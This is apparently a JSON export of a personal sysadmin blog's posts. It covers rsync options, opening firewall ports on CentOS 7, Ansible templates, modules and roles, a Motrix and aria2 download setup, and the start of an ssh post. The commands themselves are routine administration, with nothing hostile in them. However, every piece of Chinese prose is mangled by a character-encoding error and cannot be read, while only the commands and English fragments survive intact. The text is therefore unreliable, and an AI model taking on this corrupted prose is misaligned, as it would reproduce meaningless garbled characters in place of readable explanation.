--ownerï¼šä¿æŒownerå±æ€§(å±ä¸»)ã€‚ -g --groupï¼šä¿æŒgroupå±æ€§(å±ç»„)ã€‚ -p --permsï¼šä¿æŒpermså±æ€§(æƒé™ï¼Œä¸åŒ…æ‹¬ç‰¹æ®Šæƒé™)ã€‚ -D ï¼šæ˜¯\"--device --specials\"é€‰é¡¹çš„ç»„åˆï¼Œå³ä¹Ÿæ‹·è´è®¾å¤‡æ–‡ä»¶å’Œç‰¹æ®Šæ–‡ä»¶ã€‚ -l --linksï¼šå¦‚æœæ–‡ä»¶æ˜¯è½¯é“¾æ¥æ–‡ä»¶ï¼Œåˆ™æ‹·è´è½¯é“¾æ¥æœ¬èº«è€Œéè½¯é“¾æ¥æ‰€æŒ‡å‘çš„å¯¹è±¡ã€‚ -z ï¼šä¼ è¾“æ—¶è¿›è¡Œå‹ç¼©æé«˜æ•ˆç‡ã€‚ -R --relativeï¼šä½¿ç”¨ç›¸å¯¹è·¯å¾„ã€‚æ„å‘³ç€å°†å‘½ä»¤è¡Œä¸­æŒ‡å®šçš„å…¨è·¯å¾„è€Œéè·¯å¾„æœ€å°¾éƒ¨çš„æ–‡ä»¶åå‘é€ç»™æœåŠ¡ç«¯ï¼ŒåŒ…æ‹¬å®ƒä»¬çš„å±æ€§ã€‚ç”¨æ³•è§ä¸‹æ–‡ç¤ºä¾‹ã€‚ --size-only ï¼šé»˜è®¤ç®—æ³•æ˜¯æ£€æŸ¥æ–‡ä»¶å¤§å°å’Œmtimeä¸åŒçš„æ–‡ä»¶ï¼Œä½¿ç”¨æ­¤é€‰é¡¹å°†åªæ£€æŸ¥æ–‡ä»¶å¤§å°ã€‚ -u --update ï¼šä»…åœ¨æºmtimeæ¯”ç›®æ ‡å·²å­˜åœ¨æ–‡ä»¶çš„mtimeæ–°æ—¶æ‰æ‹·è´ã€‚æ³¨æ„ï¼Œè¯¥é€‰é¡¹æ˜¯æ¥æ”¶ç«¯åˆ¤æ–­çš„ï¼Œä¸ä¼šå½±å“åˆ é™¤è¡Œä¸ºã€‚ -d --dirs ï¼šä»¥ä¸é€’å½’çš„æ–¹å¼æ‹·è´ç›®å½•æœ¬èº«ã€‚é»˜è®¤é€’å½’æ—¶ï¼Œå¦‚æœæºä¸º\"dir1/file1\"ï¼Œåˆ™ä¸ä¼šæ‹·è´dir1ç›®å½•ï¼Œä½¿ç”¨è¯¥é€‰é¡¹å°†æ‹·è´dir1ä½†ä¸æ‹·è´file1ã€‚ --max-size ï¼šé™åˆ¶rsyncä¼ è¾“çš„æœ€å¤§æ–‡ä»¶å¤§å°ã€‚å¯ä»¥ä½¿ç”¨å•ä½åç¼€ï¼Œè¿˜å¯ä»¥æ˜¯ä¸€ä¸ªå°æ•°å€¼(ä¾‹å¦‚ï¼š\"--max-size=1.5m\") --min-size ï¼šé™åˆ¶rsyncä¼ è¾“çš„æœ€å°æ–‡ä»¶å¤§å°ã€‚è¿™å¯ä»¥ç”¨äºç¦æ­¢ä¼ è¾“å°æ–‡ä»¶æˆ–é‚£äº›åƒåœ¾æ–‡ä»¶ã€‚ --exclude ï¼šæŒ‡å®šæ’é™¤è§„åˆ™æ¥æ’é™¤ä¸éœ€è¦ä¼ è¾“çš„æ–‡ä»¶ã€‚ --delete ï¼šä»¥SRCä¸ºä¸»ï¼Œå¯¹DESTè¿›è¡ŒåŒæ­¥ã€‚å¤šåˆ™åˆ ä¹‹ï¼Œå°‘åˆ™è¡¥ä¹‹ã€‚æ³¨æ„\"--delete\"æ˜¯åœ¨æ¥æ”¶ç«¯æ‰§è¡Œçš„ï¼Œæ‰€ä»¥å®ƒæ˜¯åœ¨ ï¼šexclude/includeè§„åˆ™ç”Ÿæ•ˆä¹‹åæ‰æ‰§è¡Œçš„ã€‚ -b --backup ï¼šå¯¹ç›®æ ‡ä¸Šå·²å­˜åœ¨çš„æ–‡ä»¶åšä¸€ä¸ªå¤‡ä»½ï¼Œå¤‡ä»½çš„æ–‡ä»¶ååé»˜è®¤ä½¿ç”¨\"~\"åšåç¼€ã€‚ --backup-dirï¼šæŒ‡å®šå¤‡ä»½æ–‡ä»¶çš„ä¿å­˜è·¯å¾„ã€‚ä¸æŒ‡å®šæ—¶é»˜è®¤å’Œå¾…å¤‡ä»½æ–‡ä»¶ä¿å­˜åœ¨åŒä¸€ç›®å½•ä¸‹ã€‚ -e ï¼šæŒ‡å®šæ‰€è¦ä½¿ç”¨çš„è¿œç¨‹shellç¨‹åºï¼Œé»˜è®¤ä¸ºsshã€‚ --port ï¼šè¿æ¥daemonæ—¶ä½¿ç”¨çš„ç«¯å£å·ï¼Œé»˜è®¤ä¸º873ç«¯å£ã€‚ --password-fileï¼šdaemonæ¨¡å¼æ—¶çš„å¯†ç æ–‡ä»¶ï¼Œå¯ä»¥ä»ä¸­è¯»å–å¯†ç å®ç°éäº¤äº’å¼ã€‚æ³¨æ„ï¼Œè¿™ä¸æ˜¯è¿œç¨‹shellè®¤è¯çš„å¯†ç ï¼Œè€Œæ˜¯rsyncæ¨¡å—è®¤è¯çš„å¯†ç ã€‚ -W --whole-fileï¼šrsyncå°†ä¸å†ä½¿ç”¨å¢é‡ä¼ è¾“ï¼Œè€Œæ˜¯å…¨é‡ä¼ è¾“ã€‚åœ¨ç½‘ç»œå¸¦å®½é«˜äºç£ç›˜å¸¦å®½æ—¶ï¼Œè¯¥é€‰é¡¹æ¯”å¢é‡ä¼ è¾“æ›´é«˜æ•ˆã€‚ --existing ï¼šè¦æ±‚åªæ›´æ–°ç›®æ ‡ç«¯å·²å­˜åœ¨çš„æ–‡ä»¶ï¼Œç›®æ ‡ç«¯è¿˜ä¸å­˜åœ¨çš„æ–‡ä»¶ä¸ä¼ è¾“ã€‚æ³¨æ„ï¼Œä½¿ç”¨ç›¸å¯¹è·¯å¾„æ—¶å¦‚æœä¸Šå±‚ç›®å½•ä¸å­˜åœ¨ä¹Ÿä¸ä¼šä¼ è¾“ã€‚ --ignore-existingï¼šè¦æ±‚åªæ›´æ–°ç›®æ ‡ç«¯ä¸å­˜åœ¨çš„æ–‡ä»¶ã€‚å’Œ\"--existing\"ç»“åˆä½¿ç”¨æœ‰ç‰¹æ®ŠåŠŸèƒ½ï¼Œè§ä¸‹æ–‡ç¤ºä¾‹ã€‚ --remove-source-filesï¼šè¦æ±‚åˆ é™¤æºç«¯å·²ç»æˆåŠŸä¼ è¾“çš„æ–‡ä»¶ã€‚","categories":[{"name":"è¿ç»´","slug":"è¿ç»´","permalink":"https://tari.moe/categories/%E8%BF%90%E7%BB%B4/"}],"tags":[{"name":"è¿ç»´","slug":"è¿ç»´","permalink":"https://tari.moe/tags/%E8%BF%90%E7%BB%B4/"}]},{"title":"CentOS7","slug":"CentOS7","date":"2019-07-09T14:36:30.000Z","updated":"2021-04-02T02:15:38.153Z","comments":true,"path":"2019/07/09/CentOS7/","link":"","permalink":"https://tari.moe/2019/07/09/CentOS7/","excerpt":"","text":"æˆ‘ä½¿ç”¨æ»´ CentOS 7 ç‰ˆæœ¬: CentOS Linux release 7.2.1511 (Core)CentOS 6 å’Œ CentOS 7 åœ¨åä¸ºå¹³å°ä¸Šçš„ä¸¤ä¸ªä¸»è¦åŒºåˆ« CentOS6ï¼š æ”¯æŒå¿«ç…§ï¼› é‡‡ç”¨sysvinitï¼ŒæœåŠ¡å¯åŠ¨ç¨æ…¢ï¼Œfstabå’ŒnfsæŒ‚è½½å®¹æ˜“å‡ºç°é—®é¢˜ã€‚ CentOS7ï¼š ä¸æ”¯æŒå¿«ç…§ï¼Œéœ€è¦è‡ªå·±å¤‡ä»½ï¼› é‡‡ç”¨systemedï¼Œè®¾è®¡ç›®æ ‡æ˜¯å…‹æœsysvinitçš„ç¼ºç‚¹ã€‚ firewalld &amp;&amp; firewall-cmdæ–°å®‰è£…å¥½ nginx çš„æˆ‘å…´è‡´å‹ƒå‹ƒçš„è¾“å…¥æˆ‘çš„ip, ç»“æœâ€¦. äºæ˜¯æˆ‘æ£€æŸ¥ æœåŠ¡çŠ¶æ€, é…ç½®æ–‡ä»¶ å’Œ æ—¥å¿—æ–‡ä»¶ å¥½åƒåœ¨ Ubuntu ä¸Šéƒ½æ˜¯ä¸€æ ·å‘€..ç„¶åå‘ç°äº† CentOS7 çš„é˜²ç«å¢™é»˜è®¤åªå¼€å¯ ssh æœåŠ¡ 1firewall-cmd --list-services é‚£æ€ä¹ˆå»å¼€å¯ä¸€ä¸ªç«¯å£å‘¢? è¿™é‡Œç”¨ 80 ç«¯å£ä¸¾ä¾‹ 1234firewall-cmd --zone=public --add-port=80/tcp --permanent # ï¼ˆ--permanentæ°¸ä¹…ç”Ÿæ•ˆï¼Œæ²¡æœ‰æ­¤å‚æ•°é‡å¯åå¤±æ•ˆï¼‰firewall-cmd --reload # é‡æ–°è½½å…¥firewall-cmd --zone=public --query-port=80/tcp # æŸ¥çœ‹ 80 ç«¯å£firewall-cmd --zone=public --remove-port=80/tcp --permanent # å…³é—­ 80 ç«¯å£ ç„¶åå°±å¯ä»¥æ­£å¸¸è®¿é—® nginx å•¦! äºæ˜¯åˆæƒ³èµ·è®¸å¤šé˜²ç«å¢™æ˜¯é€šè¿‡ iptables å»ç®¡ç†çš„, é¡ºä¾¿åˆ° Red Hat å®˜æ–¹æ–‡æ¡£ gup äº†ä¸€ä¸‹ å‘ç°åœ¨ RHEL7 ç³»ç»Ÿä¸­, ç³»ç»Ÿé»˜è®¤æ˜¯è‡ªå¸¦ firewall çš„, å¹¶ä¸”é»˜è®¤å…³é—­å¼€å¯80ç«¯å£ å€¼å¾—ä¸€æçš„æ˜¯ firewall è°ƒç”¨ iptables çš„ç›¸å…³å‘½ä»¤. æƒ³è¦è¯¦ç»†äº†è§£å¯ä»¥å‚è€ƒ liitdarçš„åšå®¢","categories":[{"name":"è¿ç»´","slug":"è¿ç»´","permalink":"https://tari.moe/categories/%E8%BF%90%E7%BB%B4/"}],"tags":[{"name":"è¿ç»´","slug":"è¿ç»´","permalink":"https://tari.moe/tags/%E8%BF%90%E7%BB%B4/"}]},{"title":"åˆè¯† ansible (ä¸‰)","slug":"åˆè¯†-ansible-3","date":"2019-07-08T13:37:12.000Z","updated":"2021-04-02T02:28:28.341Z","comments":true,"path":"2019/07/08/åˆè¯†-ansible-3/","link":"","permalink":"https://tari.moe/2019/07/08/%E5%88%9D%E8%AF%86-ansible-3/","excerpt":"","text":"æ¨¡æ¿ templatesJinja2è¯­è¨€ ç®—æ•°è¿ç®—: //(å–æ•´) å»ºè®®æ”¾åœ¨ansibleç›®å½•ä¸‹, åˆ›å»ºä¸€ä¸ª templates æ–‡ä»¶å¤¹ æ¨¡æ¿æ–‡ä»¶åç¼€ .j2 é…ç½®æ–‡ä»¶å˜é‡ç”¨ {{ }} æ‹¬èµ·æ¥ with_items è¿­ä»£å¯¹è¿­ä»£é¡¹çš„å¼•ç”¨ï¼Œ å›ºå®šå˜é‡åä¸º â€œitemâ€è¦åœ¨ task ä¸­ä½¿ç”¨ with_items ç»™å®šè¦è¿­ä»£çš„å…ƒç´ åˆ—è¡¨åˆ—è¡¨æ ¼å¼: å­—ç¬¦ä¸² æˆ– å­—å…¸ 12345678910111213---- hosts: all remote_user: root vars_files: - vars.yml tasks: - name: unarchive unarchive: src=&#123;&#123; ansibleShellRoot &#125;&#125;&#123;&#123; item &#125;&#125; dest=/tmp/ copy=yes with_items: - test1.tar.gz - test2.tar.gz - test3.tar.gz playbook -&gt; template ä¸­çš„ for å’Œ if12345678910111213141516171819# for&#123;% for vhost in nginx_vhosts %&#125;&#123;% endraw %&#125;server &#123; listen &#123;&#123; vhost.listen | default(&#39;80 default_server&#39; ) &#125;&#125;;&#125;&#123;% endfor %&#125;# if&#123;% if vhost.server_name is defined %&#125;server_name &#123; &#123;&#123; vhost.server_name &#125;&#125;;&#125;&#123;% endif %&#125;# if&#123;% if vhost.server_name is defined %&#125;root &#123;&#123; vhost.root &#125;&#125;;&#123;% endif %&#125; for å¾ªç¯ä¸¾ä¾‹.conf.j2 æ–‡ä»¶ 1234567&#123;% for p in ports %&#125;server &#123; listen &#123;&#123; p.port &#125;&#125;; servername &#123;&#123; p.name &#125;&#125;; root &#123;&#123; p.rootdir &#125;&#125;&#125;&#123;% endfor %&#125; .yml æ–‡ä»¶ 123456789101112131415161718192021---- hosts: all remote_user: root vars_files: ports: - web1: port: 81 name: web1.site.com rootdir: /data/web1 - web2: port: 82 name: web2.site.com rootdir: /data/web2 - web3: port: 83 name: web3.site.com rootdir: /data/web3 tasks: - name: copy conf template: src=/path/**.conf.j2 dest=/path/**.conf if åˆ¤æ–­ä¸¾ä¾‹.conf.j2 æ–‡ä»¶ 1234567891011&#123;% for p in ports %&#125;server &#123; listen &#123;&#123; p.port &#125;&#125;;&#123;% if p.name is defined %&#125; servername &#123;&#123; p.name &#125;&#125;;&#123;% endif %&#125; root &#123;&#123; p.rootdir &#125;&#125;&#125;&#123;% endfor %&#125; .yml æ–‡ä»¶ 12345678910111213141516171819---- hosts: all remote_user: root vars_files: ports: - web1: port: 81 rootdir: /data/web1 - web2: port: 82 name: web2.site.com rootdir: /data/web2 - web3: port: 83 rootdir: /data/web3 tasks: - name: copy conf template: src=/path/**.conf.j2 dest=/path/**.conf roles è§’è‰²roles ä½¿å¾— playbook æ¨¡å—åŒ–ï¼Œå¹¶ä¸”åœ¨æ¨¡å—ä¸­çš„ - include roles/path ä¸­çš„rolesä¸º /etc/ansible/ è·¯å¾„ä¸‹çš„ roles. roles çš„ç›®å½•æ ‘ç»“æ„å¦‚ä¸‹å›¾æ‰€ç¤º (å…¶ä¸­çš„main.yml ç±»ä¼¼äºå…¥å£å‡½æ•°, è´Ÿè´£æŒ‰ç…§ä¸€å®šé¡ºåºè°ƒç”¨å„ä¸ªæ¨¡å—): å¦‚æœä¸Šå›¾ä¸­çš„ nginx è§’è‰²è¦è°ƒç”¨ä¸åŒè§’è‰²çš„æ–‡ä»¶, éœ€è¦ - include roles/è§’è‰²/tasks/æŸæŸ.yml è§’è‰²æ ‡ç­¾roles: { role: nginx, tages:[â€˜webâ€™, â€˜nginxâ€™]}","categories":[{"name":"è¿ç»´","slug":"è¿ç»´","permalink":"https://tari.moe/categories/%E8%BF%90%E7%BB%B4/"},{"name":"ansible","slug":"è¿ç»´/ansible","permalink":"https://tari.moe/categories/%E8%BF%90%E7%BB%B4/ansible/"}],"tags":[{"name":"è¿ç»´","slug":"è¿ç»´","permalink":"https://tari.moe/tags/%E8%BF%90%E7%BB%B4/"},{"name":"ansible","slug":"ansible","permalink":"https://tari.moe/tags/ansible/"}]},{"title":"åˆè¯† ansible (äºŒ)","slug":"åˆè¯†-ansible-2","date":"2019-07-08T05:42:59.000Z","updated":"2021-04-02T02:28:38.102Z","comments":true,"path":"2019/07/08/åˆè¯†-ansible-2/","link":"","permalink":"https://tari.moe/2019/07/08/%E5%88%9D%E8%AF%86-ansible-2/","excerpt":"","text":"ansible å¸¸ç”¨æ¨¡å— Command: åœ¨è¿œç¨‹ä¸»æœºæ‰§è¡Œå‘½ä»¤, é»˜è®¤æ¨¡å—, å¯å¿½ç•¥ -m é€‰é¡¹ansible all (-m command) -a â€˜service nginx restartâ€™æ­¤å‘½ä»¤ä¸æ”¯æŒ $VARNAME &lt; &gt; | ; &amp; *ç­‰, ç”¨ shell æ¨¡å—å®ç° Shell: -a å‚æ•°å°½é‡æ”¾åˆ°å•å¼•å·ä¸­!ansible all -m shell -a â€˜echo pass | passwd -stdin userâ€™è°ƒç”¨bashæ‰§è¡Œå‘½ä»¤ è•¾è¥¿ cat /tmp/stanley.md | awk -F â€˜|â€™ â€˜print $1,$2â€™ &amp;&gt; /tmp/example.txtè¿™äº›å¤æ‚å‘½ä»¤, å³ä½¿ä½¿ç”¨ shell ä¹Ÿå¯èƒ½ä¼šå¤±è´¥, è§£å†³åŠæ³•: å†™åˆ°è„šæœ¬æ—¶, copyåˆ°è¿œç¨‹, æ‰§è¡Œ. å†æŠŠéœ€è¦çš„ç»“æœæ‹‰å›æ‰§è¡Œå‘½ä»¤çš„æœºå™¨ Script: è¿è¡Œè„šæœ¬ -a â€œ/PATH/TO/SCRIPT_FILEâ€ansible all -m script -a shel.sh ansible-vault åŠ å¯†è§£å¯†123456789ansible-vault encrypt file.yml ansible-vault decrypt file.yml ansible-vault edit file.yml ansible-vault view file.yml ansible-vault reykey file.yml ansible-console äº¤äº’YAML è¯­æ³•åœ¨å•ä¸€æ¡£æ¡ˆä¸­, å¯ç”¨è¿ç»­ä¸‰ä¸ªè¿å­—å·(â€”)åŒºåˆ†å¤šä¸ªæ¡£æ¡ˆ. å¦å¤–, è¿˜æœ‰é€‰æ‹©æ€§çš„è¿ç»­ä¸‰ä¸ªç‚¹å¥½(â€¦)ç”¨æ¥è¡¨ç¤ºæ¡£æ¡ˆç»“å°¾é£æ ¼å’Œpythonç±»ä¼¼ä¸€ä¸ªå®Œæ•´ä»£ç åŠŸèƒ½éœ€æœ€å°‘å…ƒç´ åŒ…å« name: task module: arguments (arguments ä¸€èˆ¬æ˜¯ key=value)æ‹“å±•åé€šå¸¸ä¸º yml æˆ– yaml æ¨¡æ¿: - hosts: websrvs remote_user: root tasks: - name: test connection ping: ansibleç›®å½•ä¸‹ vars.yml ä¸“ç”¨äºå­˜æ”¾å˜é‡ ansible-playbook è¿è¡Œ playbook çš„æ–¹å¼ ansible-playbook &lt;filename.yml&gt; â€¦ [options] -check æ£€æŸ¥ â€“list-hosts åˆ—å‡ºè¿è¡Œä»»åŠ¡çš„ä¸»æœº â€“limit åªé’ˆå¯¹ä¸»æœºåˆ—è¡¨ä¸­çš„ä¸»æœºæ‰§è¡Œ -v æ˜¾ç¤ºè¿‡ç¨‹ -vv -vvv æ›´è¯¦ç»† ä¸€ä¸ªæ¨¡å—åªå¯¹åº”ä¸€ä¸ªå†…å®¹ å¦‚ä¸‹: task : - name: copy file1 copy: src=file1 dest=/path/ copy: src=file2 dest=/path/ è¿™æ ·åªä¼š copy file2 é¡ºä¾¿è®°ä¸‹ backup å‚æ•°, backup=yes ä¼šåœ¨å¤åˆ¶å‰å¤‡ä»½ä¸€ä¸ª, é˜²æ­¢è¦†ç›–.å¤‡ä»½çš„æ–‡ä»¶åæ˜¯: æ–‡ä»¶å_éšæœºæ•°_æ—¶é—´ ignore_errors å³ä½¿é€”ä¸­å‡ºé”™ä¹Ÿä¼šç»§ç»­è¿è¡Œ: tasks: - name: rum and ignore the result shell: ... ignore_errors: True handlers ä¸ notify è§¦å‘äº‹ä»¶ handlers ç”¨äºå½“å…³æ³¨çš„èµ„æºå‘ç”Ÿå˜åŒ–æ—¶, æ‰ä¼šæ‰ä¼šé‡‡å–ä¸€å®šçš„æ“ä½œ notify è°ƒç”¨ handler ä¸­å®šä¹‰çš„æ“ä½œ handlers ä¸ tasks åŒçº§, å¹¶ä¸” notify åå­—éœ€è¦ä¸ handlers ä¸­çš„ name åå­—ç›¸åŒ hosts: websrvs remote_user: root tasks: - name: add group nginx user: name=nginx state=present - name: add user nginx user: name=nginx state=present group=nginx - name: install Nginx yum: name=nginx state=present notify: - restart Nginx - check Nginx process handlers: - name: restart Nginx service: name=nginx state=restartd enabled=yes - name: check Nginx process shell: killall -0 nginx tags æ ‡ç­¾ å¯ä»¥å•ç‹¬åªæ‰§è¡Œæ ‡ç­¾å¤šä¸ªåŠ¨ä½œå¯ä»¥å…¬ç”¨ä¸€ä¸ªæ ‡ç­¾ 1ansible-playbook -t æ ‡ç­¾ æ–‡ä»¶.yml å˜é‡çš„ä½¿ç”¨ ansible setup facts è¿œç¨‹ä¸»æœºçš„æ‰€æœ‰å˜é‡éƒ½å¯ç›´æ¥è°ƒç”¨ ansible all -m setup æŸ¥çœ‹æ‰€æœ‰ç³»ç»Ÿè‡ªå¸¦å˜é‡ åœ¨ /etc/ansible/hosts ä¸­å®šä¹‰ æ™®é€šå˜é‡: ä¸»æœºç»„ä¸­ä¸»æœºå•ç‹¬å®šä¹‰, ä¼˜å…ˆçº§é«˜äºå…¬å…±å˜é‡ å¦‚: [websrvs] 192.168.22.33 http_port=81 192.168.22.34 http_port=82 å…¬å…±(ç»„)å˜é‡: é’ˆå¯¹ä¸»æœºç»„ä¸­æ‰€æœ‰ä¸»æœºå®šä¹‰ç»Ÿä¸€å˜é‡ å¦‚: [websrvs:vars] nodename=www domainname=example.com é€šè¿‡å‘½ä»¤è¡Œåˆ¶å®šå˜é‡, ä¼˜å…ˆçº§æœ€é«˜ å¦‚: ansible-playbook -e varname=value åœ¨ playbook ä¸­å®šä¹‰ vars:\\- var1:value1 \\- var12:value2 åœ¨ role ä¸­å®šä¹‰","categories":[{"name":"è¿ç»´","slug":"è¿ç»´","permalink":"https://tari.moe/categories/%E8%BF%90%E7%BB%B4/"},{"name":"ansible","slug":"è¿ç»´/ansible","permalink":"https://tari.moe/categories/%E8%BF%90%E7%BB%B4/ansible/"}],"tags":[{"name":"è¿ç»´","slug":"è¿ç»´","permalink":"https://tari.moe/tags/%E8%BF%90%E7%BB%B4/"},{"name":"ansible","slug":"ansible","permalink":"https://tari.moe/tags/ansible/"}]},{"title":"Motrix + aria2 è¸©å‘","slug":"Motrix+aria2_è¸©å‘","date":"2019-07-07T16:11:33.000Z","updated":"2021-04-02T02:25:11.842Z","comments":true,"path":"2019/07/08/Motrix+aria2_è¸©å‘/","link":"","permalink":"https://tari.moe/2019/07/08/Motrix+aria2_%E8%B8%A9%E5%9D%91/","excerpt":"","text":"æ¡ˆå‘å‰: è¢« é¨·äº‚æ™‚ç¯€çš„å°‘å¥³å€‘ çš„OP ä¹™å¥³ã©ã‚‚ã‚ˆ å¸å¼•æƒ³å»è¿½ç•ªçš„æˆ‘, çœ‹ç€çœ‹ç€çªç„¶æœ‰ä¸¤ä¸ªåŸŸåèµ„æºåŠ è½½ä¸å‡ºæ¥, ç„¶åæƒ³ç€æŠŠè¿™ä¸¤ä¸ªåŸŸååŠ å…¥åˆ°æˆ‘çš„pacä¸­, ç„¶åå‘ç°, æˆ‘çš„pacåªç”¨é“¾æ¥çš„,â€¦äºæ˜¯å°±è·‘åˆ°åˆ«äººç½‘ç›˜ä¸Šå»ä¸‹è½½pacäº†. å°±çªç„¶æƒ³èµ·ç½‘é¡µç‰ˆç½‘ç›˜è¿˜èƒ½å…¨é€Ÿè·‘çš„éªšæ“ä½œ, æƒ³å®‰è£…ä¸€æ³¢â€¦ç„¶åå°±å®Œå…¨å¿˜äº†çœ‹ç•ªè¿™ä»¶äº‹äº†â€¦.. Motrix(1.4.1) + aria2(1.34.0)çªç„¶è§‰å¾—ç™¾åº¦äº‘ç›˜ç›´æ¥ç”¨webç«¯ä¼šæ–¹ä¾¿å¾ˆå¤š,äºæ˜¯æƒ³å°è¯•ç€å»ä½¿ç”¨ Motrix + aria2 + BaiduExporter çš„ç»„åˆ, ç„¶åå°±æ‰å‘äº†â€¦. Motrix å®˜ç½‘ä¸‹è½½å°±å¥½å•¦!ç¼–è¯‘å®‰è£…æœ€æ–°ç‰ˆæœ¬æ»´ aria2è§£å‹è¿›å…¥ç›®å½•ç¼–è¯‘å®‰è£…ä¸€æ¡é¾™â€¦(è®°å¾—åˆ‡æ¢ä½rootç”¨æˆ·,ä¸ç„¶å®‰è£…æ—¶æœ‰å¯èƒ½æç¤ºæƒé™ä¸å¤Ÿ)é¢„ç¼–è¯‘ä¹Ÿä¸éœ€è¦åŠ å…¶ä»–æ‹“å±•,é»˜è®¤å°±OKå•¦! 1234sudo sutar &amp;&amp; cd &amp;&amp; ./configuremakemake install é…ç½®ç»§ç»­ä¿æŒrootç”¨æˆ·, æ–¹ä¾¿æ“ä½œé…ç½®æ–‡ä»¶ç›®å½•ä»»æ„, ä½†è¦ä¿æŒä¸‹é¢çš„pathéƒ½åœ¨åŒä¸€path .session æ–‡ä»¶ä¸€å®šè¦æœ‰å–”!aria2.conf çš„é…ç½®å¯ä»¥å‚è€ƒä¸‹æˆ‘æ»´ 12mkdir /path/aria2 &amp;&amp; touch /path/aria2.session &amp;&amp; chmod 777 /path/aria2.sessionvim /path/aria2.conf é…ç½®å®Œæˆå°±å¯ä»¥ä½¿ç”¨å•¦!(æ‰æ€ª)è¦ä¹ˆä½ æ˜¯rootç”¨æˆ·, ä¸ç„¶å¯åŠ¨ aria2c ä¸€å®šè®°å¾—åŠ  sudo!! æˆ‘å°±è¢«å‘äº†â€¦emmm 1234sudo aria2c --conf-path=/path/aria2/aria2.conf# è¿™ä¸ªæ˜¯åœ¨åå°è¿è¡Œ, è¿˜æ²¡ä¸‹è½½æˆåŠŸä¹‹å‰å»ºè®®ç”¨ä¸Šé¢çš„, æ–¹ä¾¿æŸ¥çœ‹è¿è¡Œç»“æœsudo aria2c --conf-path=/path/aria2/aria2.conf -D å®‰è£… BaiduExporter(æˆ‘ä½¿ç”¨çš„æ˜¯0.8.5)è®°å¾—å®‰è£…æœ€æ–°ç‰ˆæœ¬, æˆ‘å°±å› ä¸ºæ²¡å®‰è£…æœ€æ–°ç‰ˆæœ¬, ä»–åŸæœ¬å¯¹ pan.baidu.com ä¹‹ç±»çš„åŸŸåæ˜¯æ²¡æœ‰æˆæƒ, å¯¼è‡´aria2è®¿é—®ä¸åˆ°, å“­æ­»â€¦ä»”ç»†çœ‹README.MDçš„é‡è¦æ€§â€¦. éšä¾¿æ‰¾ä¸ªå¯ä»¥ä¸‹è½½ç™¾åº¦äº‘çš„é“¾æ¥æ‰“å¼€, çœ‹åˆ° MO.app åœ¨ ä¿å­˜åˆ°ç½‘ç›˜ ä¸‹è½½ç­‰æŒ‰é’®é™„ä»¶å°±çŸ¥é“æ’ä»¶å®‰è£…æˆåŠŸå•¦!!(è®°å¾—åœ¨chromeæ‹“å±•çœ‹çœ‹æœ‰æ²¡æœ‰æŠ¥é”™, æŠ¥é”™è¦é‡è£…å–”!) è¯´è¯´ MO.app é‡Œé¢ è®¾ç½® é‡Œé¢ä¸»è¦å­—æ®µçš„å«ä¹‰å§! RPCåœ°å€ä½¿ç”¨MOä¸‹è½½: å°±æ˜¯ä¸‹è½½æŒ‰é’®çš„åå­—å•¦!åé¢è·Ÿç€çš„å†…å®¹åœ¨README.MEæœ‰è¯´, æˆ‘çš„æ˜¯http://token:(åœ¨motrix Preference-&gt;Advanced-&gt;Security-&gt;RPCSecret é‡Œé¢çš„å†…å®¹)@localhost:16800/jsonrpc User-Agentåœ¨ Motrix Preference-&gt;Advanced-&gt;Security: Mock User-Agent é€‰æ‹© du Refererä¿æŒé»˜è®¤çš„ https://pan.baidu.com/disk/home å°±å¥½å•¦! Motrix çš„é…ç½®æ›´æ”¹åè®°å¾—ç‚¹ Save &amp; Apply å°±å¥½å•¦!æˆ‘è¸©æ»´å‘ä¸€107/07 22:22:06 [ERROR] Failed to serialize session to &#x27;/etc/aria2/aria2.session&#x27;. è¿™ä¸ªä¸»è¦æ˜¯å› ä¸ºæˆ‘æ²¡æœ‰ç”¨ sudo è¿è¡Œ aria2c äºŒ123456707/07 23:46:37 [ERROR] CUID#10 - Download aborted. URI=https://pcs.baidu.com/rest/2.0/pcs/file?method=download&amp;app_id=250528&amp;path=%2F%E6%88%91%E7%9A%84%E8%B5%84%E6%BA%90%2F%E5%9B%9E%E9%A1%BE%E8%A7%86%E9%A2%91.mp4Exception: [AbstractCommand.cc:351] errorCode=22 URI=https://pcs.baidu.com/rest/2.0/pcs/file?method=download&amp;app_id=250528&amp;path=%2F%E6%88%91%E7%9A%84%E8%B5%84%E6%BA%90%2F%E5%9B%9E%E9%A1%BE%E8%A7%86%E9%A2%91.mp4 -&gt; [HttpSkipResponseCommand.cc:240] errorCode=22 The response status is not successful. status=40307/07 23:46:37 [NOTICE] Download GID#2384700d4e908591 not complete: /home/tari/Downloads/å›é¡¾è§†é¢‘.mp4 è¿™ä¸ªä¸»è¦æ˜¯å› ä¸ºæˆ‘æ’ä»¶å…³äºç™¾åº¦äº‘ç›˜çš„åŸŸåæˆæƒé—®é¢˜, ä¿æŒå¥½æ’ä»¶æœ€æ–°ç‰ˆæœ¬å°±å¥½å•¦!","categories":[{"name":"æ—¥å¸¸æŠ˜è…¾","slug":"æ—¥å¸¸æŠ˜è…¾","permalink":"https://tari.moe/categories/%E6%97%A5%E5%B8%B8%E6%8A%98%E8%85%BE/"},{"name":"Motrix","slug":"æ—¥å¸¸æŠ˜è…¾/Motrix","permalink":"https://tari.moe/categories/%E6%97%A5%E5%B8%B8%E6%8A%98%E8%85%BE/Motrix/"},{"name":"aria2","slug":"æ—¥å¸¸æŠ˜è…¾/Motrix/aria2","permalink":"https://tari.moe/categories/%E6%97%A5%E5%B8%B8%E6%8A%98%E8%85%BE/Motrix/aria2/"}],"tags":[{"name":"æ—¥å¸¸æŠ˜è…¾","slug":"æ—¥å¸¸æŠ˜è…¾","permalink":"https://tari.moe/tags/%E6%97%A5%E5%B8%B8%E6%8A%98%E8%85%BE/"},{"name":"Motrix","slug":"Motrix","permalink":"https://tari.moe/tags/Motrix/"},{"name":"aria2","slug":"aria2","permalink":"https://tari.moe/tags/aria2/"}]},{"title":"about ssh","slug":"ssh","date":"2019-07-06T12:44:05.000Z","updated":"2021-04-02T02:27:18.059Z","comments":true,"path":"2019/07/06/ssh/","link":"","permalink":"https://tari.moe/2019/07/06/ssh/","excerpt":"","text":"/etc/hosts.deny ç¦ç”¨æ— æ•ˆåŸå› ï¼šç¼–è¯‘å®‰è£…æ—¶é»˜è®¤æ²¡æœ‰åŠ è½½libwrapåº“ [è½¬è½½è‡ª è‰¯è®¸Linux] Secure Shellç¼©å†™æ˜¯SSHï¼Œ ç”±IETFçš„ç½‘ç»œå·¥ä½œå°ç»„ï¼ˆNetwork Working 